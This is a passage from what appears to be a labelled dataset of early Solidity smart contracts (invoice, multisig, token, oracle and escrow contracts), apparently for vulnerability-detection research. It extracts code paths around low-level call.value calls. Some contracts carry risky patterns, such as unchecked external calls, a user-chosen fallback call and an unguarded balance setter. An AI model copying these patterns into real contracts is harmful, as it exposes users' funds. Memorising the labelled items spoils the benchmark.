ownerSetMinBet(uint newMinimumBet) public onlyOwner { minBet = newMinimumBet; } function getMinBet() public onlyOwner returns(uint) { return minBet; } function ownerTransferEther(address sendTo, uint amount) public onlyOwner { contractBalance = safeSub(contractBalance, amount); setMaxProfit(); require(sendTo.send(amount)); LogOwnerTransfer(sendTo, amount); } function ownerPauseGame(bool newStatus) public onlyOwner { gamePaused = newStatus; } function ownerPausePayouts(bool newPayoutStatus) public onlyOwner { payoutsPaused = newPayoutStatus; } function ownerChangeOwner(address newOwner) public onlyOwner { owner = newOwner; } function ownerkill() public onlyOwner { suicide(owner); } } "}
{"sol name": "39932.sol", "label": 0, "first path": "function process(bytes32 _destination) payable returns (bool) { if (msg.value < 100) throw; var tax = msg.value * taxPerc / 100; var refill = bytes4(sha3(\"refill(bytes32)\")); if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw; return true; contract Invoice is Mortal { address   public signer; uint      public closeBlock; Comission public comission; string    public description; bytes32   public beneficiary; uint      public value; ", "second path": "function process(bytes32 _destination) payable returns (bool) { if (msg.value < 100) throw; var tax = msg.value * taxPerc / 100; var refill = bytes4(sha3(\"refill(bytes32)\")); if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw; return true; contract Invoice is Mortal { address   public signer; uint      public closeBlock; Comission public comission; string    public description; bytes32   public beneficiary; uint      public value; ", "third path": "function process(bytes32 _destination) payable returns (bool) { if (msg.value < 100) throw; var tax = msg.value * taxPerc / 100; var refill = bytes4(sha3(\"refill(bytes32)\")); if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw; return true; contract Invoice is Mortal { address   public signer; uint      public closeBlock; Comission public comission; string    public description; bytes32   public beneficiary; uint      public value; ", "long path": "pragma solidity ^0.4.4; contract Owned { address public owner; function Owned() { owner = msg.sender; } function delegate(address _owner) onlyOwner { owner = _owner; } modifier onlyOwner { if (msg.sender != owner) throw; _; } } contract Mortal is Owned { function kill() onlyOwner { suicide(owner); } } contract Comission is Mortal { address public ledger; bytes32 public taxman; uint    public taxPerc; function Comission(address _ledger, bytes32 _taxman, uint _taxPerc) { ledger  = _ledger; taxman  = _taxman; taxPerc = _taxPerc; } function process(bytes32 _destination) payable returns (bool) { if (msg.value < 100) throw; var tax = msg.value * taxPerc / 100; var refill = bytes4(sha3(\"refill(bytes32)\")); if ( !ledger.call.value(tax)(refill, taxman)|| !ledger.call.value(msg.value - tax)(refill, _destination)) throw; return true; } } contract Invoice is Mortal { address   public signer; uint      public closeBlock; Comission public comission; string    public description; bytes32   public beneficiary; uint      public value; function Invoice(address _comission, string  _description, bytes32 _beneficiary, uint    _value) { comission   = Comission(_comission); description = _description; beneficiary = _beneficiary; value       = _value; } function withdraw() onlyOwner { if (closeBlock != 0) { if (!comission.process.value(value)(beneficiary)) throw; } } function () payable { if (msg.value != value || closeBlock != 0) throw; closeBlock = block.number; signer = msg.sender; PaymentReceived(); } event PaymentReceived(); } library CreatorInvoice { function create(address _comission, string _description, bytes32 _beneficiary, uint256 _value) returns (Invoice) { return new Invoice(_comission, _description, _beneficiary, _value); } function version() constant returns (string) { return \"v0.5.0 (a9ea4c6c)\"; } function abi() constant returns (string) { return '[{\"constant\":true,\"inputs\":[],\"name\":\"signer\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"beneficiary\",\"outputs\":[{\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"comission\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"value\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"_owner\",\"type\":\"address\"}],\"name\":\"delegate\",\"outputs\":[],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"description\",\"outputs\":[{\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"closeBlock\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"name\":\"\",\"type\":\"address\"}],\"payable\":false,\"type\":\"function\"},{\"inputs\":[{\"name\":\"_comission\",\"type\":\"address\"},{\"name\":\"_description\",\"type\":\"string\"},{\"name\":\"_beneficiary\",\"type\":\"bytes32\"},{\"name\":\"_value\",\"type\":\"uint256\"}],\"type\":\"constructor\"},{\"payable\":true,\"type\":\"fallback\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"PaymentReceived\",\"type\":\"event\"}]'; } } contract Builder is Mortal { event Builded(address indexed client, address indexed instance); mapping(address => address[]) public getContractsOf; function getLastContract() constant returns (address) { var sender_contracts = getContractsOf[msg.sender]; return sender_contracts[sender_contracts.length - 1]; } address public beneficiary; function setBeneficiary(address _beneficiary) onlyOwner { beneficiary = _beneficiary; } uint public buildingCostWei; function setCost(uint _buildingCostWei) onlyOwner { buildingCostWei = _buildingCostWei; } string public securityCheckURI; function setSecurityCheck(string _uri) onlyOwner { securityCheckURI = _uri; } } contract BuilderInvoice is Builder { function create(address _comission, string _description, bytes32 _beneficiary, uint _value, address _client) payable returns (address) { if (buildingCostWei > 0 && beneficiary != 0) { if (msg.value < buildingCostWei) throw; if (!beneficiary.send(buildingCostWei)) throw; if (msg.value > buildingCostWei) { if (!msg.sender.send(msg.value - buildingCostWei)) throw; } } else { if (msg.value > 0) { if (!msg.sender.send(msg.value)) throw; } } if (_client == 0) _client = msg.sender; var inst = CreatorInvoice.create(_comission, _description, _beneficiary, _value); inst.delegate(_client); Builded(_client, inst); getContractsOf[_client].push(inst); return inst; } } "}
{"sol name": "31759.sol", "label": 0, "first path": "function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination,  uint value, bytes data)  external { bytes32 txHash = keccak256(byte(0x19),  byte(0), this, nonce++, destination, value, data  ); verifySignatures( sigV,sigR,sigS,txHash); require(destination.call.value(value)(data)); ", "second path": "function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination,  uint value, bytes data)  external { bytes32 txHash = keccak256(byte(0x19),  byte(0), this, nonce++, destination, value, data  ); verifySignatures( sigV,sigR,sigS,txHash); require(destination.call.value(value)(data)); ", "third path": "function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination,  uint value, bytes data)  external { bytes32 txHash = keccak256(byte(0x19),  byte(0), this, nonce++, destination, value, data  ); verifySignatures( sigV,sigR,sigS,txHash); require(destination.call.value(value)(data)); ", "long path": "pragma solidity ^0.4.18; contract TransferableMultsig { uint public nonce; uint public threshold; mapping (address => bool) ownerMap; address[] public owners; function TransferableMultsig( uint      _threshold, address[] _owners ) public { updateOwners(_threshold, _owners); } function () payable public {} function execute(uint8[] sigV, bytes32[] sigR, bytes32[] sigS, address destination,  uint value, bytes data)  external { bytes32 txHash = keccak256(byte(0x19),  byte(0), this, nonce++, destination, value, data  ); verifySignatures( sigV,sigR,sigS,txHash); require(destination.call.value(value)(data)); } function transferOwnership( uint8[]   sigV, bytes32[] sigR, bytes32[] sigS, uint      _threshold, address[] _owners ) external { bytes32 txHash = keccak256( byte(0x19), byte(0), this, nonce++, _threshold, _owners ); verifySignatures( sigV, sigR, sigS, txHash ); updateOwners(_threshold, _owners); } function verifySignatures( uint8[]   sigV, bytes32[] sigR, bytes32[] sigS, bytes32   txHash ) view internal { uint _threshold = threshold; require(_threshold == sigR.length); require(_threshold == sigS.length); require(_threshold == sigV.length); address lastAddr = 0x0; for (uint i = 0; i < threshold; i++) { address recovered = ecrecover( txHash, sigV[i], sigR[i], sigS[i] ); require(recovered > lastAddr && ownerMap[recovered]); lastAddr = recovered; } } function updateOwners( uint      _threshold, address[] _owners ) internal { require(_owners.length <= 10); require(_threshold <= _owners.length); require(_threshold != 0); address[] memory currentOwners = owners; for (uint i = 0; i < currentOwners.length; i++) { ownerMap[currentOwners[i]] = false; } address lastAddr = 0x0; for (i = 0; i < _owners.length; i++) { address owner = _owners[i]; require(owner > lastAddr); ownerMap[owner] = true; lastAddr = owner; } owners = _owners; threshold = _threshold; } } "}
{"sol name": "22902.sol", "label": 0, "first path": "function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) { if (isContract(_to)) { require(allowedAddresses[_to]); if (balanceOf(msg.sender) < _value) revert(); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); TransferContract(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "second path": "function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) { if (isContract(_to)) { require(allowedAddresses[_to]); if (balanceOf(msg.sender) < _value) revert(); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); TransferContract(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "third path": "function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) { if (isContract(_to)) { require(allowedAddresses[_to]); if (balanceOf(msg.sender) < _value) revert(); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); TransferContract(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); ", "long path": "pragma solidity ^0.4.18; contract ETHPriceWatcher { address public ethPriceProvider; modifier onlyEthPriceProvider() { require(msg.sender == ethPriceProvider); _; } function receiveEthPrice(uint ethUsdPrice) external; function setEthPriceProvider(address provider) external; } contract OraclizeI { address public cbAddress; function query(uint _timestamp, string _datasource, string _arg) external payable returns (bytes32 _id); function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) external payable returns (bytes32 _id); function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) public payable returns (bytes32 _id); function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) external payable returns (bytes32 _id); function queryN(uint _timestamp, string _datasource, bytes _argN) public payable returns (bytes32 _id); function queryN_withGasLimit(uint _timestamp, string _datasource, bytes _argN, uint _gaslimit) external payable returns (bytes32 _id); function getPrice(string _datasource) public returns (uint _dsprice); function getPrice(string _datasource, uint gaslimit) public returns (uint _dsprice); function setProofType(byte _proofType) external; function setCustomGasPrice(uint _gasPrice) external; function randomDS_getSessionPubKeyHash() external constant returns(bytes32); } contract OraclizeAddrResolverI { function getAddress() public returns (address _addr); } contract usingOraclize { uint constant day = 60*60*24; uint constant week = 60*60*24*7; uint constant month = 60*60*24*30; byte constant proofType_NONE = 0x00; byte constant proofType_TLSNotary = 0x10; byte constant proofType_Android = 0x20; byte constant proofType_Ledger = 0x30; byte constant proofType_Native = 0xF0; byte constant proofStorage_IPFS = 0x01; uint8 constant networkID_auto = 0; uint8 constant networkID_mainnet = 1; uint8 constant networkID_testnet = 2; uint8 constant networkID_morden = 2; uint8 constant networkID_consensys = 161; OraclizeAddrResolverI OAR; OraclizeI oraclize; modifier oraclizeAPI { if((address(OAR)==0)||(getCodeSize(address(OAR))==0)) oraclize_setNetwork(networkID_auto); if(address(oraclize) != OAR.getAddress()) oraclize = OraclizeI(OAR.getAddress()); _; } modifier coupon(string code){ oraclize = OraclizeI(OAR.getAddress()); _; } function oraclize_setNetwork(uint8 networkID) internal returns(bool){ return oraclize_setNetwork(); networkID; } function oraclize_setNetwork() internal returns(bool){ if (getCodeSize(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed)>0){ OAR = OraclizeAddrResolverI(0x1d3B2638a7cC9f2CB3D298A3DA7a90B67E5506ed); oraclize_setNetworkName(\"eth_mainnet\"); return true; } if (getCodeSize(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1)>0){ OAR = OraclizeAddrResolverI(0xc03A2615D5efaf5F49F60B7BB6583eaec212fdf1); oraclize_setNetworkName(\"eth_ropsten3\"); return true; } if (getCodeSize(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e)>0){ OAR = OraclizeAddrResolverI(0xB7A07BcF2Ba2f2703b24C0691b5278999C59AC7e); oraclize_setNetworkName(\"eth_kovan\"); return true; } if (getCodeSize(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48)>0){ OAR = OraclizeAddrResolverI(0x146500cfd35B22E4A392Fe0aDc06De1a1368Ed48); oraclize_setNetworkName(\"eth_rinkeby\"); return true; } if (getCodeSize(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475)>0){ OAR = OraclizeAddrResolverI(0x6f485C8BF6fc43eA212E93BBF8ce046C7f1cb475); return true; } if (getCodeSize(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF)>0){ OAR = OraclizeAddrResolverI(0x20e12A1F859B3FeaE5Fb2A0A32C18F5a65555bBF); return true; } if (getCodeSize(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA)>0){ OAR = OraclizeAddrResolverI(0x51efaF4c8B3C9AfBD5aB9F4bbC82784Ab6ef8fAA); return true; } return false; } function __callback(bytes32 myid, string result) public { __callback(myid, result); } function oraclize_getPrice(string datasource) oraclizeAPI internal returns (uint){ return oraclize.getPrice(datasource); } function oraclize_getPrice(string datasource, uint gaslimit) oraclizeAPI internal returns (uint){ return oraclize.getPrice(datasource, gaslimit); } function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){ uint price = oraclize.getPrice(datasource); if (price > 1 ether + tx.gasprice*200000) return 0; return oraclize.query.value(price)(timestamp, datasource, arg); } function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){ uint price = oraclize.getPrice(datasource, gaslimit); if (price > 1 ether + tx.gasprice*gaslimit) return 0; return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit); } function oraclize_cbAddress() oraclizeAPI internal returns (address){ return oraclize.cbAddress(); } function oraclize_setProof(byte proofP) oraclizeAPI internal { return oraclize.setProofType(proofP); } function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal { return oraclize.setCustomGasPrice(gasPrice); } function getCodeSize(address _addr) constant internal returns(uint _size) { assembly { _size := extcodesize(_addr) } } function parseInt(string _a) internal pure returns (uint) { return parseInt(_a, 0); } function parseInt(string _a, uint _b) internal pure returns (uint) { bytes memory bresult = bytes(_a); uint mint = 0; bool decimals = false; for (uint i=0; i<bresult.length; i++){ if ((bresult[i] >= 48)&&(bresult[i] <= 57)){ if (decimals){ if (_b == 0) break; else _b--; } mint *= 10; mint += uint(bresult[i]) - 48; } else if (bresult[i] == 46) decimals = true; } if (_b > 0) mint *= 10**_b; return mint; } string oraclize_network_name; function oraclize_setNetworkName(string _network_name) internal { oraclize_network_name = _network_name; } function oraclize_getNetworkName() internal view returns (string) { return oraclize_network_name; } } contract Ownable { address public owner; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); function Ownable() public { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) public onlyOwner { require(newOwner != address(0)); OwnershipTransferred(owner, newOwner); owner = newOwner; } } contract BuildingStatus is Ownable { address public observer; address public crowdsale; enum statusEnum { crowdsale, refund, preparation_works, building_permit, design_technical_documentation, utilities_outsite, construction_residential, frame20, frame40, frame60, frame80, frame100, stage1, stage2, stage3, stage4, stage5, facades20, facades40, facades60, facades80, facades100, engineering, finishing, construction_parking, civil_works, engineering_further, commisioning_project, completed } modifier notCompleted() { require(status != statusEnum.completed); _; } modifier onlyObserver() { require(msg.sender == observer || msg.sender == owner || msg.sender == address(this)); _; } modifier onlyCrowdsale() { require(msg.sender == crowdsale || msg.sender == owner || msg.sender == address(this)); _; } statusEnum public status; event StatusChanged(statusEnum newStatus); function setStatus(statusEnum newStatus) onlyCrowdsale  public { status = newStatus; StatusChanged(newStatus); } function changeStage(uint8 stage) public onlyObserver { if (stage==1) status = statusEnum.stage1; if (stage==2) status = statusEnum.stage2; if (stage==3) status = statusEnum.stage3; if (stage==4) status = statusEnum.stage4; if (stage==5) status = statusEnum.stage5; } } contract PermissionManager is Ownable { mapping (address => bool) permittedAddresses; function addAddress(address newAddress) public onlyOwner { permittedAddresses[newAddress] = true; } function removeAddress(address remAddress) public onlyOwner { permittedAddresses[remAddress] = false; } function isPermitted(address pAddress) public view returns(bool) { if (permittedAddresses[pAddress]) { return true; } return false; } } contract Registry is Ownable { struct ContributorData { bool isActive; uint contributionETH; uint contributionUSD; uint tokensIssued; uint quoteUSD; uint contributionRNTB; } mapping(address => ContributorData) public contributorList; mapping(uint => address) private contributorIndexes; uint private nextContributorIndex; PermissionManager public permissionManager; bool public completed; modifier onlyPermitted() { require(permissionManager.isPermitted(msg.sender)); _; } event ContributionAdded(address _contributor, uint overallEth, uint overallUSD, uint overallToken, uint quote); event ContributionEdited(address _contributor, uint overallEth, uint overallUSD,  uint overallToken, uint quote); function Registry(address pManager) public { permissionManager = PermissionManager(pManager); completed = false; } function setPermissionManager(address _permadr) public onlyOwner { require(_permadr != 0x0); permissionManager = PermissionManager(_permadr); } function isActiveContributor(address contributor) public view returns(bool) { return contributorList[contributor].isActive; } function removeContribution(address contributor) public onlyPermitted { contributorList[contributor].isActive = false; } function setCompleted(bool compl) public onlyPermitted { completed = compl; } function addContribution(address _contributor, uint _amount, uint _amusd, uint _tokens, uint _quote ) public onlyPermitted { if (contributorList[_contributor].isActive == false) { contributorList[_contributor].isActive = true; contributorList[_contributor].contributionETH = _amount; contributorList[_contributor].contributionUSD = _amusd; contributorList[_contributor].tokensIssued = _tokens; contributorList[_contributor].quoteUSD = _quote; contributorIndexes[nextContributorIndex] = _contributor; nextContributorIndex++; } else { contributorList[_contributor].contributionETH += _amount; contributorList[_contributor].contributionUSD += _amusd; contributorList[_contributor].tokensIssued += _tokens; contributorList[_contributor].quoteUSD = _quote; } ContributionAdded(_contributor, contributorList[_contributor].contributionETH, contributorList[_contributor].contributionUSD, contributorList[_contributor].tokensIssued, contributorList[_contributor].quoteUSD); } function editContribution(address _contributor, uint _amount, uint _amusd, uint _tokens, uint _quote) public onlyPermitted { if (contributorList[_contributor].isActive == true) { contributorList[_contributor].contributionETH = _amount; contributorList[_contributor].contributionUSD = _amusd; contributorList[_contributor].tokensIssued = _tokens; contributorList[_contributor].quoteUSD = _quote; } ContributionEdited(_contributor, contributorList[_contributor].contributionETH, contributorList[_contributor].contributionUSD, contributorList[_contributor].tokensIssued, contributorList[_contributor].quoteUSD); } function addContributor(address _contributor, uint _amount, uint _amusd, uint _tokens, uint _quote) public onlyPermitted { contributorList[_contributor].isActive = true; contributorList[_contributor].contributionETH = _amount; contributorList[_contributor].contributionUSD = _amusd; contributorList[_contributor].tokensIssued = _tokens; contributorList[_contributor].quoteUSD = _quote; contributorIndexes[nextContributorIndex] = _contributor; nextContributorIndex++; ContributionAdded(_contributor, contributorList[_contributor].contributionETH, contributorList[_contributor].contributionUSD, contributorList[_contributor].tokensIssued, contributorList[_contributor].quoteUSD); } function getContributionETH(address _contributor) public view returns (uint) { return contributorList[_contributor].contributionETH; } function getContributionUSD(address _contributor) public view returns (uint) { return contributorList[_contributor].contributionUSD; } function getContributionRNTB(address _contributor) public view returns (uint) { return contributorList[_contributor].contributionRNTB; } function getContributionTokens(address _contributor) public view returns (uint) { return contributorList[_contributor].tokensIssued; } function addRNTBContribution(address _contributor, uint _amount) public onlyPermitted { if (contributorList[_contributor].isActive == false) { contributorList[_contributor].isActive = true; contributorList[_contributor].contributionRNTB = _amount; contributorIndexes[nextContributorIndex] = _contributor; nextContributorIndex++; } else { contributorList[_contributor].contributionETH += _amount; } } function getContributorByIndex(uint index) public view  returns (address) { return contributorIndexes[index]; } function getContributorAmount() public view returns(uint) { return nextContributorIndex; } } contract OraclizeC is Ownable, usingOraclize { uint public updateInterval = 300; uint public gasLimit = 200000; mapping (bytes32 => bool) validIds; string public url; enum State { New, Stopped, Active } State public state = State.New; event LogOraclizeQuery(string description, uint balance, uint blockTimestamp); event LogOraclizeAddrResolverI(address oar); modifier inActiveState() { require(state == State.Active); _; } modifier inStoppedState() { require(state == State.Stopped); _; } modifier inNewState() { require(state == State.New); _; } function setUpdateInterval(uint newInterval) external onlyOwner { require(newInterval > 0); updateInterval = newInterval; } function setUrl(string newUrl) external onlyOwner { require(bytes(newUrl).length > 0); url = newUrl; } function setGasLimit(uint _gasLimit) external onlyOwner { require(_gasLimit > 50000); gasLimit = _gasLimit; } function setGasPrice(uint gasPrice) external onlyOwner { require(gasPrice >= 1000000000); oraclize_setCustomGasPrice(gasPrice); } function setOraclizeAddrResolverI(address __oar) public onlyOwner { require(__oar != 0x0); OAR = OraclizeAddrResolverI(__oar); LogOraclizeAddrResolverI(__oar); } function withdraw(address receiver) external onlyOwner inStoppedState { require(receiver != 0x0); receiver.transfer(this.balance); } } contract Pausable is Ownable { event Pause(); event Unpause(); bool public paused = false; modifier whenNotPaused() { require(!paused); _; } modifier whenPaused() { require(paused); _; } function pause() onlyOwner whenNotPaused public { paused = true; Pause(); } function unpause() onlyOwner whenPaused public { paused = false; Unpause(); } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract ETHPriceProvider is OraclizeC { using SafeMath for uint; uint public currentPrice; ETHPriceWatcher public watcher; event LogPriceUpdated(string getPrice, uint setPrice, uint blockTimestamp); event LogStartUpdate(uint startingPrice, uint updateInterval, uint blockTimestamp); function notifyWatcher() internal; function ETHPriceProvider(string _url) payable public { url = _url; } function startUpdate(uint startingPrice) payable onlyOwner inNewState public { state = State.Active; currentPrice = startingPrice; update(updateInterval); notifyWatcher(); LogStartUpdate(startingPrice, updateInterval, block.timestamp); } function stopUpdate() external onlyOwner inActiveState { state = State.Stopped; } function setWatcher(address newWatcher) external onlyOwner { require(newWatcher != 0x0); watcher = ETHPriceWatcher(newWatcher); } function __callback(bytes32 myid, string result) public { require(msg.sender == oraclize_cbAddress() && validIds[myid]); delete validIds[myid]; uint newPrice = parseInt(result, 2); if (state == State.Active) { update(updateInterval); } require(newPrice > 0); currentPrice = newPrice; notifyWatcher(); LogPriceUpdated(result,newPrice,block.timestamp); } function update(uint delay) private { if (oraclize_getPrice(\"URL\") > this.balance) { state = State.Stopped; LogOraclizeQuery(\"Oraclize query was NOT sent\", this.balance,block.timestamp); } else { bytes32 queryId = oraclize_query(delay, \"URL\", url, gasLimit); validIds[queryId] = true; } } function getQuote() public constant returns (uint) { return currentPrice; } } contract ConvertQuote is ETHPriceProvider { function ConvertQuote(uint _currentPrice) ETHPriceProvider(\"BIa/Nnj1+ipZBrrLIgpTsI6ukQTlTJMd1c0iC7zvxx+nZzq9ODgBSmCLo3Zc0sYZwD8mlruAi5DblQvt2cGsfVeCyqaxu+1lWD325kgN6o0LxrOUW9OQWn2COB3TzcRL51Q+ZLBsT955S1OJbOqsfQ4gg/l2awe2EFVuO3WTprvwKhAa8tjl2iPYU/AJ83TVP9Kpz+ugTJumlz2Y6SPBGMNcvBoRq3MlnrR2h/XdqPbh3S2bxjbSTLwyZzu2DAgVtybPO1oJETY=\") payable public { currentPrice = _currentPrice; } function notifyWatcher() internal { if(address(watcher) != 0x0) { watcher.receiveEthPrice(currentPrice); } } } contract ERC223ReceivingContract { struct TKN { address sender; uint value; bytes data; bytes4 sig; } function tokenFallback(address _from, uint _value, bytes _data) public pure { TKN memory tkn; tkn.sender = _from; tkn.value = _value; tkn.data = _data; if(_data.length > 0) { uint32 u = uint32(_data[3]) + (uint32(_data[2]) << 8) + (uint32(_data[1]) << 16) + (uint32(_data[0]) << 24); tkn.sig = bytes4(u); } } } contract ERC223Interface { uint public totalSupply; function balanceOf(address who) public view returns (uint); function allowedAddressesOf(address who) public view returns (bool); function getTotalSupply() public view returns (uint); function transfer(address to, uint value) public returns (bool ok); function transfer(address to, uint value, bytes data) public returns (bool ok); function transfer(address to, uint value, bytes data, string custom_fallback) public returns (bool ok); event Transfer(address indexed from, address indexed to, uint value, bytes data); event TransferContract(address indexed from, address indexed to, uint value, bytes data); } contract UnityToken is ERC223Interface { using SafeMath for uint; string public constant name = \"Unity Token\"; string public constant symbol = \"UNT\"; uint8 public constant decimals = 18; uint public constant INITIAL_SUPPLY = 100000 * (10 ** uint(decimals)); mapping(address => uint) balances; mapping(address => bool) allowedAddresses; modifier onlyOwner() { require(msg.sender == owner); _; } function addAllowed(address newAddress) public onlyOwner { allowedAddresses[newAddress] = true; } function removeAllowed(address remAddress) public onlyOwner { allowedAddresses[remAddress] = false; } address public owner; function UnityToken() public { owner = msg.sender; totalSupply = INITIAL_SUPPLY; balances[owner] = INITIAL_SUPPLY; } function getTotalSupply() public view returns (uint) { return totalSupply; } function transfer(address _to, uint _value, bytes _data, string _custom_fallback) public returns (bool success) { if (isContract(_to)) { require(allowedAddresses[_to]); if (balanceOf(msg.sender) < _value) revert(); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); assert(_to.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data)); TransferContract(msg.sender, _to, _value, _data); return true; } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint _value, bytes _data) public returns (bool success) { if (isContract(_to)) { return transferToContract(_to, _value, _data); } else { return transferToAddress(_to, _value, _data); } } function transfer(address _to, uint _value) public returns (bool success) { bytes memory empty; if (isContract(_to)) { return transferToContract(_to, _value, empty); } else { return transferToAddress(_to, _value, empty); } } function isContract(address _addr) private view returns (bool is_contract) { uint length; assembly { length := extcodesize(_addr) } return (length > 0); } function transferToAddress(address _to, uint _value, bytes _data) private returns (bool success) { if (balanceOf(msg.sender) < _value)  revert(); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value, _data); return true; } function transferToContract(address _to, uint _value, bytes _data) private returns (bool success) { require(allowedAddresses[_to]); if (balanceOf(msg.sender) < _value) revert(); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); ERC223ReceivingContract receiver = ERC223ReceivingContract(_to); receiver.tokenFallback(msg.sender, _value, _data); TransferContract(msg.sender, _to, _value, _data); return true; } function balanceOf(address _owner) public view returns (uint balance) { return balances[_owner]; } function allowedAddressesOf(address _owner) public view returns (bool allowed) { return allowedAddresses[_owner]; } } contract Hold is Ownable { uint8 stages = 5; uint8 public percentage; uint8 public currentStage; uint public initialBalance; uint public withdrawed; address public multisig; Registry registry; PermissionManager public permissionManager; uint nextContributorToTransferEth; address public observer; uint dateDeployed; mapping(address => bool) private hasWithdrawedEth; event InitialBalanceChanged(uint balance); event EthReleased(uint ethreleased); event EthRefunded(address contributor, uint ethrefunded); event StageChanged(uint8 newStage); event EthReturnedToOwner(address owner, uint balance); modifier onlyPermitted() { require(permissionManager.isPermitted(msg.sender) || msg.sender == owner); _; } modifier onlyObserver() { require(msg.sender == observer || msg.sender == owner); _; } function Hold(address _multisig, uint cap, address pm, address registryAddress, address observerAddr) public { percentage = 100 / stages; currentStage = 0; multisig = _multisig; initialBalance = cap; dateDeployed = now; permissionManager = PermissionManager(pm); registry = Registry(registryAddress); observer = observerAddr; } function setPermissionManager(address _permadr) public onlyOwner { require(_permadr != 0x0); permissionManager = PermissionManager(_permadr); } function setObserver(address observerAddr) public onlyOwner { require(observerAddr != 0x0); observer = observerAddr; } function setInitialBalance(uint inBal) public { initialBalance = inBal; InitialBalanceChanged(inBal); } function releaseAllETH() onlyPermitted public { uint balReleased = getBalanceReleased(); require(balReleased > 0); require(this.balance >= balReleased); multisig.transfer(balReleased); withdrawed += balReleased; EthReleased(balReleased); } function releaseETH(uint n) onlyPermitted public { require(this.balance >= n); require(getBalanceReleased() >= n); multisig.transfer(n); withdrawed += n; EthReleased(n); } function getBalance() public view returns (uint) { return this.balance; } function changeStageAndReleaseETH() public onlyObserver { uint8 newStage = currentStage + 1; require(newStage <= stages); currentStage = newStage; StageChanged(newStage); releaseAllETH(); } function changeStage() public onlyObserver { uint8 newStage = currentStage + 1; require(newStage <= stages); currentStage = newStage; StageChanged(newStage); } function getBalanceReleased() public view returns (uint) { return initialBalance * percentage * currentStage / 100 - withdrawed ; } function returnETHByOwner() public onlyOwner { require(now > dateDeployed + 183 days); uint balance = getBalance(); owner.transfer(getBalance()); EthReturnedToOwner(owner, balance); } function refund(uint _numberOfReturns) public onlyOwner { require(_numberOfReturns > 0); address currentParticipantAddress; for (uint cnt = 0; cnt < _numberOfReturns; cnt++) { currentParticipantAddress = registry.getContributorByIndex(nextContributorToTransferEth); if (currentParticipantAddress == 0x0) return; if (!hasWithdrawedEth[currentParticipantAddress]) { uint EthAmount = 